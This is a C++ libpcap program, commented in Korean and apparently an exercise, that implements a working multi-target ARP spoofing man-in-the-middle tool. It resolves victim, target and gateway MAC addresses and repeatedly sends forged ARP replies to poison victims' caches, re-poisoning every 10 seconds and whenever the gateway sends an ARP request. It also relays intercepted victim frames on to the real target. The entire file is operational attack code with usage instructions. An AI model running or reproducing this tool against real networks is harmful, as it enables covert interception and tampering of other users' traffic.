#include <iostream>
#include <string>
#include <vector>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>         
#include <iomanip>
#include <map>
#include <thread>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

Ip myIpAddr;
Mac myMacAddr;

Ip gatewayIpAddr;
Mac gatewayMacAddr;

Mac findAndGetMac(pcap_t* handle, const char* victim_ip) {
	struct pcap_pkthdr* header;
	const u_char* packet;
	int res;
	time_t start_time = time(nullptr); // 시작 시간 기록

	Ip victim_ip_obj(ntohl(inet_addr(victim_ip)));
	while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
		if (res == 0) {
			if (difftime(time(nullptr), start_time) > 5) { 
				// 패킷은 수신을 못하여 타임아웃을 발생했을 때 5초가 지난경우
				// 5초 경과 확인
				cerr << "Timeout after 5 seconds while waiting for ARP reply." << endl;
				return Mac::nullMac(); // 타임아웃 시 빈 MAC 주소 반환
			}
			else
				continue; // 타임아웃 발생 시 루프 계속
		}
		EthArpPacket* arp_reply = (EthArpPacket*)packet;
		// 디버깅용 출력
		//cout << "\nA: \n" << arp_reply->arp_.sip() << endl;
		//cout << "\nB: \n" << victim_ip_obj << endl;
		// ARP 응답인지 확인하고, 올바른 IP에 대한 응답인지 확인
		if (arp_reply->eth_.type() == EthHdr::Arp && arp_reply->arp_.op() == ArpHdr::Reply && arp_reply->arp_.sip() == victim_ip_obj)
			return arp_reply->arp_.smac();// 응답 패킷에서 상대방의 MAC 주소 추출

		if (difftime(time(nullptr), start_time) > 5) { 
			// 패킷은 수신하지만 5초 동안 쓸잘데기 없는 패킷만 받은 경우
			// 5초 경과 확인
			cerr << "Timeout after 5 seconds while waiting for ARP reply." << endl;
			return Mac::nullMac(); // 타임아웃 시 빈 MAC 주소 반환
		}
	}
	cerr << "Failed to capture ARP reply for " << victim_ip << endl;
	return Mac::nullMac(); // 실패 시 빈 MAC 주소 반환
}

void GetMyIPAndMAC(const char* device){
	pcap_if_t* alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	uint32_t res = pcap_findalldevs(&alldevs, errbuf);
	printf("Finding My IP and MAC address for device %s...\n", device);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, errbuf);
		exit(-1);
	}
	for (pcap_if_t* d = alldevs; d != NULL; d = d->next)
		if (strcmp(d->name, device) == 0)
			for (pcap_addr_t* a = d->addresses; a != NULL; a = a->next)
				if (a->addr->sa_family == AF_INET)
				{
					myIpAddr = Ip(ntohl(((struct sockaddr_in*)a->addr)->sin_addr.s_addr));
					struct ifreq s;
					struct sockaddr* sa;
					uint32_t fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
					strcpy(s.ifr_name, d->name);
					// Get MAC Address
					if (ioctl(fd, SIOCGIFHWADDR, &s) != 0)
					{
						printf("Failed to find MAC address.\n");
						pcap_freealldevs(alldevs);
						close(fd);
						exit(-1);
					}
					uint8_t tmpmac[6];
					for (uint32_t i = 0; i < 6; i++)
						tmpmac[i] = s.ifr_addr.sa_data[i];
					myMacAddr = Mac(tmpmac);
					close(fd);
					pcap_freealldevs(alldevs);
					return;
				}
	printf("Failed to find IP address.\n");
	pcap_freealldevs(alldevs);
	exit(-1);
}

void usage() {
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> <sender ip 2> <target ip 2> ...\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 ...\n");
}

void printMacAddress(const Mac& mac) {
	const uint8_t* mac_bytes = static_cast<const uint8_t*>(mac);
	for (int i = 0; i < Mac::SIZE; ++i) {
		cout << hex << setw(2) << setfill('0') << static_cast<int>(mac_bytes[i]); //16진수 출력
		if (i < Mac::SIZE - 1)cout << ":";
	}
	cout << dec; //10진수로 돌려놓기
}

void relayPacketJumbo(pcap_t* handle, const u_char* packet, struct pcap_pkthdr* header, const Mac& victimMac, const Mac& targetMac) {
	//static int packet_count = 0;  // 패킷 번호를 추적하기 위한 변수

	size_t packet_len = header->len;
	size_t offset = 0;

	while (offset < packet_len) {
		// 남은 데이터를 1500바이트로 나누기
		size_t chunk_size = (packet_len - offset > 1500) ? 1500 : (packet_len - offset);
		// 점보 데이터를 분할해서 패킷 전송하는지 궁금해서 디버깅을 위한 출력
		//cout << "Packet Length: " << packet_len << ", Offset: " << offset << ", Chunk Size: " << chunk_size << endl;

		// 패킷 복사본 생성
		u_char* modified_packet = new u_char[1500];
		memcpy(modified_packet, packet + offset, chunk_size);

		EthHdr* eth = (EthHdr*)modified_packet;

		// 송신자가 피해자인 경우, 패킷을 타겟에 전송
		if (eth->smac() == victimMac) {
			//cout << "packet detected from victim. relaying..." << endl;

			//packet_count++;  // 패킷 번호 증가

			//cout << "===============================" << endl;
			//cout << "Packet #" << packet_count << endl;
			//cout << "===============================" << endl;

			//cout << "Packet from victim found" << endl;

			// IP 헤더 위치 찾기 (Ethernet 헤더 이후)
			//const u_char* ip_header = modified_packet + sizeof(EthHdr);
			//const struct in_addr* src_ip_addr = (struct in_addr*)(ip_header + 12); // IP 헤더에서 출발지 IP는 12바이트 이후에 위치
			//const struct in_addr* dest_ip_addr = (struct in_addr*)(ip_header + 16); // IP 헤더에서 목적지 IP는 16바이트 이후에 위치

			// 출발지 IP 주소 출력
			//char src_ip_str[INET_ADDRSTRLEN];
			//inet_ntop(AF_INET, src_ip_addr, src_ip_str, INET_ADDRSTRLEN);
			//cout << "Source IP: " << src_ip_str << endl;

			// 목적지 IP 주소 출력
			//char dest_ip_str[INET_ADDRSTRLEN];
			//inet_ntop(AF_INET, dest_ip_addr, dest_ip_str, INET_ADDRSTRLEN);
			//cout << "Destination IP: " << dest_ip_str << endl;

			// IP 헤더에서 프로토콜 타입을 읽음
			//uint8_t protocol = *(ip_header + 9); // IP 헤더에서 프로토콜은 9바이트 위치에 있음

			// 프로토콜 번호에 대응하는 이름으로 변환
			/*
			map<uint8_t, string> protocol_map = {
				{1, "ICMP"},
				{6, "TCP"},
				{17, "UDP"},
				{89, "OSPF"}
				// 필요한 경우 더 많은 프로토콜 추가 가능
			};
			*/
			// 프로토콜 이름 출력
			//string protocol_name = protocol_map.count(protocol) ? protocol_map[protocol] : "Unknown";
			//cout << "Protocol: " << protocol_name << " (" << (int)protocol << ")" << endl;

			//cout << "===============================" << endl;
			//cout << endl;

			// 목적지 MAC 주소를 타겟으로 설정하고 패킷을 재전송
			eth->dmac_ = targetMac;
			eth->smac_ = myMacAddr;  // 송신자 MAC 주소 설정 (공격자의 MAC 주소로 설정)
			// 이 코드에서 eth->smac_ = myMacAddr; 를 설정하는 이유:
			// 1. 네트워크에서 L2 스위치(스위칭 허브)가 패킷을 처리할 때, 패킷의 이더넷 헤더에 포함된 송신자 MAC 주소를 보고 
			//    그 MAC 주소가 어느 포트에 연결되어 있는지를 학습하고 관리함.
			// 2. 스위치가 패킷을 올바른 포트로 전달하기 위해서는 송신자 MAC 주소가 스위치가 학습한 포트 정보와 일치해야 함.
			// 3. 만약 릴레이 패킷의 송신자 MAC 주소를 피해자의 MAC 주소로 설정하면, 스위치는 이 MAC 주소가 피해자의 포트에 
			//    있어야 하는데, 현재 패킷은 공격자의 포트에서 들어오게 됨.
			// 4. 이 경우 스위치는 MAC 주소 테이블이 혼란스러워지며, 패킷을 제대로 처리하지 못할 수 있음.
			// 5. 따라서, 송신자 MAC 주소를 공격자의 MAC 주소로 설정하여 스위치가 패킷을 올바르게 처리하도록 해야 함.
			// 6. 이 설정을 통해 스위치는 공격자의 포트에서 온 패킷을 정상적으로 처리하고, 목표 장치(게이트웨이 등)는 
			//    IP 헤더에 있는 출발지 IP 주소를 확인하여 해당 IP 주소의 MAC 주소를 ARP 테이블에서 찾아 응답을 피해자에게 
			//    보낼 수 있게 됨.
			// 7. 결론적으로, eth->smac_ = myMacAddr; 을 설정함으로써 패킷이 L2 스위치를 정상적으로 통과하고, 네트워크 
			//    통신이 원활하게 이루어지도록 보장함.


			int res = pcap_sendpacket(handle, modified_packet, chunk_size);
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
		}

		delete[] modified_packet; // 복사본 메모리 해제
		offset += chunk_size;  // 다음 조각으로 이동
	}
}


void relayPacket(pcap_t* handle, const u_char* packet, struct pcap_pkthdr* header, const Mac& victimMac, const Mac& targetMac) {
	//static int packet_count = 0;  // 패킷 번호를 추적하기 위한 변수

	//디버깅용
	size_t packet_len = header->len;
	//cout << "Packet Length: " << packet_len << endl;
	// 패킷 복사본 생성
	u_char* modified_packet = new u_char[header->len];
	memcpy(modified_packet, packet, header->len);

	EthHdr* eth = (EthHdr*)modified_packet;

	// 송신자가 피해자인 경우, 패킷을 타겟에 전송
	if (eth->smac() == victimMac) {
		//cout << "packet detected from victim. relaying..." << endl;
		//packet_count++;  // 패킷 번호 증가

		//cout << "===============================" << endl;
		//cout << "Packet #" << packet_count << endl;
		//cout << "===============================" << endl;

		//cout << "Packet from victim found" << endl;

		// IP 헤더 위치 찾기 (Ethernet 헤더 이후)
		//const u_char* ip_header = modified_packet + sizeof(EthHdr);
		//const struct in_addr* src_ip_addr = (struct in_addr*)(ip_header + 12); // IP 헤더에서 출발지 IP는 12바이트 이후에 위치
		//const struct in_addr* dest_ip_addr = (struct in_addr*)(ip_header + 16); // IP 헤더에서 목적지 IP는 16바이트 이후에 위치

		// 출발지 IP 주소 출력
		//char src_ip_str[INET_ADDRSTRLEN];
		//inet_ntop(AF_INET, src_ip_addr, src_ip_str, INET_ADDRSTRLEN);
		//cout << "Source IP: " << src_ip_str << endl;

		// 목적지 IP 주소 출력
		//char dest_ip_str[INET_ADDRSTRLEN];
		//inet_ntop(AF_INET, dest_ip_addr, dest_ip_str, INET_ADDRSTRLEN);
		//cout << "Destination IP: " << dest_ip_str << endl;

		// IP 헤더에서 프로토콜 타입을 읽음
		//uint8_t protocol = *(ip_header + 9); // IP 헤더에서 프로토콜은 9바이트 위치에 있음

		// 프로토콜 번호에 대응하는 이름으로 변환
		/*
		map<uint8_t, string> protocol_map = {
			{1, "ICMP"},
			{6, "TCP"},
			{17, "UDP"},
			{89, "OSPF"}
			// 필요한 경우 더 많은 프로토콜 추가 가능
		};
		*/
		// 프로토콜 이름 출력
		//string protocol_name = protocol_map.count(protocol) ? protocol_map[protocol] : "Unknown";
		//cout << "Protocol: " << protocol_name << " (" << (int)protocol << ")" << endl;

		//cout << "===============================" << endl;
		//cout << endl;

		// 목적지 MAC 주소를 타겟으로 설정하고 패킷을 재전송
		eth->dmac_ = targetMac;
		eth->smac_ = myMacAddr;  // 송신자 MAC 주소 설정 (공격자의 MAC 주소로 설정)
		// 이 코드에서 eth->smac_ = myMacAddr; 를 설정하는 이유:
		// 1. 네트워크에서 L2 스위치(스위칭 허브)가 패킷을 처리할 때, 패킷의 이더넷 헤더에 포함된 송신자 MAC 주소를 보고 
		//    그 MAC 주소가 어느 포트에 연결되어 있는지를 학습하고 관리함.
		// 2. 스위치가 패킷을 올바른 포트로 전달하기 위해서는 송신자 MAC 주소가 스위치가 학습한 포트 정보와 일치해야 함.
		// 3. 만약 릴레이 패킷의 송신자 MAC 주소를 피해자의 MAC 주소로 설정하면, 스위치는 이 MAC 주소가 피해자의 포트에 
		//    있어야 하는데, 현재 패킷은 공격자의 포트에서 들어오게 됨.
		// 4. 이 경우 스위치는 MAC 주소 테이블이 혼란스러워지며, 패킷을 제대로 처리하지 못할 수 있음.
		// 5. 따라서, 송신자 MAC 주소를 공격자의 MAC 주소로 설정하여 스위치가 패킷을 올바르게 처리하도록 해야 함.
		// 6. 이 설정을 통해 스위치는 공격자의 포트에서 온 패킷을 정상적으로 처리하고, 목표 장치(게이트웨이 등)는 
		//    IP 헤더에 있는 출발지 IP 주소를 확인하여 해당 IP 주소의 MAC 주소를 ARP 테이블에서 찾아 응답을 피해자에게 
		//    보낼 수 있게 됨.
		// 7. 결론적으로, eth->smac_ = myMacAddr; 을 설정함으로써 패킷이 L2 스위치를 정상적으로 통과하고, 네트워크 
		//    통신이 원활하게 이루어지도록 보장함.


		int res = pcap_sendpacket(handle, modified_packet, header->len);
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}

	delete[] modified_packet; // 복사본 메모리 해제
}

void sendArpRequest(pcap_t* handle, const char* victim_ip) {
	//상대의 맥을 찾는 리퀘스트
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = myMacAddr;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = myMacAddr;
	packet.arp_.sip_ = htonl(myIpAddr);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(victim_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(-1);
	}
}

void performArpAttack(pcap_t* handle, const Mac& victim_mac, const char* victim_ip, const char* target_ip) {
	//센더에게 타겟맥이 나 어택커의 맥이라고 속이기.
	EthArpPacket packetAttack;
	packetAttack.eth_.dmac_ = victim_mac;
	packetAttack.eth_.smac_ = myMacAddr;
	packetAttack.eth_.type_ = htons(EthHdr::Arp);
	packetAttack.arp_.hrd_ = htons(ArpHdr::ETHER);
	packetAttack.arp_.pro_ = htons(EthHdr::Ip4);
	packetAttack.arp_.hln_ = Mac::SIZE;
	packetAttack.arp_.pln_ = Ip::SIZE;
	packetAttack.arp_.op_ = htons(ArpHdr::Reply);
	packetAttack.arp_.smac_ = myMacAddr;
	packetAttack.arp_.sip_ = htonl(Ip(target_ip));
	packetAttack.arp_.tmac_ = victim_mac;
	packetAttack.arp_.tip_ = htonl(Ip(victim_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetAttack), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(-1);
	}
}

// 게이트웨이 IP 가져오는 함수
Ip getGatewayIp() {
	FILE* fp;
	char gateway_ip[16] = { 0 };

	fp = popen("ip route | grep default | awk '{print $3}'", "r");
	if (fp == nullptr) {
		perror("popen error");
		return Ip(); // 빈 Ip 객체 반환
	}

	if (fgets(gateway_ip, sizeof(gateway_ip), fp) == nullptr) {
		perror("fgets error");
		pclose(fp);
		return Ip(); // 빈 Ip 객체 반환
	}

	pclose(fp);
	gateway_ip[strcspn(gateway_ip, "\n")] = 0; // 개행 문자 제거
	return Ip(string(gateway_ip)); // Ip 객체로 변환하여 반환
}

// ARP 공격을 반복 수행하는 스레드
void arpAttackLoop(pcap_t* handle, const vector<Mac>& victimMacs, const vector<char*>& victim_ips, const vector<char*>& target_ips) {
	while (true) {
		cout << "Periodically executing ARP attacks..." << endl;
		for (size_t i = 0; i < victimMacs.size(); i++) {
			performArpAttack(handle, victimMacs[i], victim_ips[i], target_ips[i]);
		}
		this_thread::sleep_for(chrono::seconds(10));  // 주기적으로 공격 (10초마다, 필요에 따라 조정)
	}
}

//게이트웨이의 ARP 요청을 감지와 패킷 릴레이를 처리하는 스레드
void relayAndMonitorLoop(pcap_t* handle, const vector<Mac>& victimMacs, const vector<Mac>& targetMacs, const vector<char*>& victim_ips, const vector<char*>& target_ips, Ip gatewayIpAddr) {
	struct pcap_pkthdr* header;
	const u_char* packet;

	while (true) {

		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) {
			continue; // 타임아웃 발생 시 루프 계속
		}
		else if (res == -1 || res == -2) {
			cerr << "Error occurred while capturing packets" << endl;
			break;
		}

		EthArpPacket* ethArpPacket = (EthArpPacket*)packet;

		// ARP 패킷인지 확인
		if (ethArpPacket->eth_.type() == EthHdr::Arp) {
			// ARP 요청이고, 출발지 IP가 게이트웨이인지 확인
			if (ethArpPacket->arp_.op() == ArpHdr::Request && ethArpPacket->arp_.sip() == gatewayIpAddr) {
				cout << "ARP request detected from gateway. Reapplying ARP attack..." << endl;
				for (size_t i = 0; i < victimMacs.size(); i++) {
					performArpAttack(handle, victimMacs[i], victim_ips[i], target_ips[i]);
				}
			}
		}
		else {
			// 일반 데이터 패킷인 경우, 릴레이 처리
			for (size_t i = 0; i < victimMacs.size(); i++) {
				//relayPacket(handle, packet, header, victimMacs[i], targetMacs[i]);
				relayPacketJumbo(handle, packet, header, victimMacs[i], targetMacs[i]);
			}
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc <4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); // 타임아웃을 1000ms로 설정
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	vector<char *> victim_ip;
	vector<char *> target_ip;
	for (int i = 2; i < argc; i++) {
		if (i % 2 == 0) victim_ip.push_back(argv[i]);
		else target_ip.push_back(argv[i]);
	}
	if (victim_ip.size() != target_ip.size()) {
		usage();
		return -1;
	}

	cout << "Program start..." << endl << endl<<endl;
	GetMyIPAndMAC(dev);
	cout << "MAC Address of My IP (" << string(myIpAddr)<< ") is ";
	printMacAddress(myMacAddr); // MAC 주소 출력
	cout << endl;
	cout << endl;

	//게이트 웨이 아이피 찾아 오기
	gatewayIpAddr = getGatewayIp();
	if (gatewayIpAddr == Ip("0.0.0.0")) { // 기본값인 0.0.0.0과 비교하여 초기화 확인
		cerr << "i don't find gatewayIP" << endl;
		return -1;
	}
	cout << "gateway IP: " << string(gatewayIpAddr) << endl;
	sendArpRequest(handle, string(gatewayIpAddr).c_str());
	Mac gateway_mac = findAndGetMac(handle, string(gatewayIpAddr).c_str());
	if (gateway_mac.isNull()) {
		cerr << "Failed to get MAC address for gateway ip: " << string(gatewayIpAddr) << endl;
		return -1;
	}
	gatewayMacAddr = gateway_mac;
	cout << "MAC Address of gateway IP (" << string(gatewayIpAddr) << ") is ";
	printMacAddress(gatewayMacAddr);
	cout << endl;
	cout << endl;
	//////////////////////////////////////


	vector<Mac> victimMacs(victim_ip.size());
	vector<Mac> targetMacs(target_ip.size());

	for (int i = 0; i < victim_ip.size(); i++) {
		printf("finding MAC address for victim[%d] (%s)...\n", i + 1, victim_ip[i]);
		sendArpRequest(handle, victim_ip[i]);
		Mac victim_mac = findAndGetMac(handle, victim_ip[i]);
		if (victim_mac.isNull()) {
			cerr << "Failed to get MAC address for " << victim_ip[i] << endl;
			return -1;
		}
		victimMacs[i] = victim_mac;
		cout << "MAC Address of victim[" << i + 1 << "] IP (" << victim_ip[i] << ") is ";
		printMacAddress(victim_mac);
		cout << endl;
		cout << endl;

		//타겟 맥 주소 알아내기
		printf("finding MAC address for target[%d] (%s)...\n", i + 1, target_ip[i]);
		sendArpRequest(handle, target_ip[i]);
		Mac target_mac = findAndGetMac(handle, target_ip[i]);
		if (target_mac.isNull()) {
			cerr << "Failed to get MAC address for " << target_ip[i] << endl;
			return -1;
		}
		targetMacs[i] = target_mac;
		cout << "MAC Address of target[" << i + 1 << "] IP (" << target_ip[i] << ") is ";
		printMacAddress(target_mac);
		cout << endl;
		cout << endl;

		
	}
	cout << endl;

	cout << "Starting ARP attack..." << endl;

	
	// 스레드를 사용하여 각각의 기능을 독립적으로 수행
	thread arpThread(arpAttackLoop, handle, ref(victimMacs), ref(victim_ip), ref(target_ip));
	thread relayAndMonitorThread(relayAndMonitorLoop, handle, ref(victimMacs), ref(targetMacs), ref(victim_ip), ref(target_ip), gatewayIpAddr);

	// 스레드가 종료되지 않도록 유지
	arpThread.join();
	relayAndMonitorThread.join();
	
	cout << endl;
	
	cout << "Program exit..." << endl;
	pcap_close(handle);
}
